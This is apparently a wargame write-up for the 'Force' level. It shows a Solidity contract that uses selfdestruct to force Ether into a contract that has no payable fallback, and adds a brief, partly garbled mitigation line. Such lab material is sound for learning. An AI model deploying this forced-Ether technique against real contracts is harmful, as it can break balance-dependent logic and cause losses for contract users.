## Objectives

1. Send Ether to the Force contract.

## Vulnerabilities

### Expecting that a contract can't hold any ether

A contract with no `payable` `fallback` function can still receive Ether.

## Exploit

1. Write and deploy a simple hack contract like the following ones:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IForce {}

contract ForceHack {
    IForce target;

    constructor(address _targetAddress) payable {
        target = IForce(_targetAddress);
    }

    function kaboom() external {
        selfdestruct(payable(address(target)));
    }
}
```

2. Call the `kaboom` function to `selfdestruct` the ForceHack contract and send the balance to
   the Force contract.

## Suggested mitigation

- Read the contract's balance directly instead of assuming that its balance.
